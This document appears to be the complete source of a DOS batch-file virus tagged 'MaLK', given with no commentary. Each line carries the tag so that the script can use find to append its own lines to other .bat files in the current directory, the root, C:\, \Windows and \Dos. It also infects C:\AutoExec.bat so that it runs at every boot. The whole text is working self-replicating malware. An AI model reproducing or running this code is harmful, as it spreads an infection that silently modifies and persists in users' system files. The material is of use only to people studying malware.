@echo off%[MaLK]%
if exist \noway goto MaLK
if not exist %0.bat goto MaLK
if %0==AUTOEXEC goto MaLKAuto
for %%f in (*.bat) do set MaLK=%%f
find /i "MaLK"<%MaLK%>nul
if errorlevel 1 find "MaLK"<%0.bat>>%MaLK%
for %%f in (\*.bat) do set MaLK=%%f
find /i "MaLK"<%MaLK%>nul
if errorlevel 1 find "MaLK"<%0.bat>>%MaLK%
for %%f in (c:\*.bat) do set MaLK=%%f
find /i "MaLK"<%MaLK%>nul
if errorlevel 1 find "MaLK"<%0.bat>>%MaLK%
:MaLK
for %%f in (c:\AutoExec.bat) do set MaLK=%%f
find /i "MaLK"<%MaLK%>nul
if errorlevel 1 find "MaLK"<%0.bat>>%MaLK%
:MaLKAuto
for %%f in (*.bat \Windows\*.bat \Dos\*.bat) do set MaLK=%%f
find /i "MaLK"<%MaLK%>nul
if errorlevel 1 find "MaLK"<%0.bat>>%MaLK%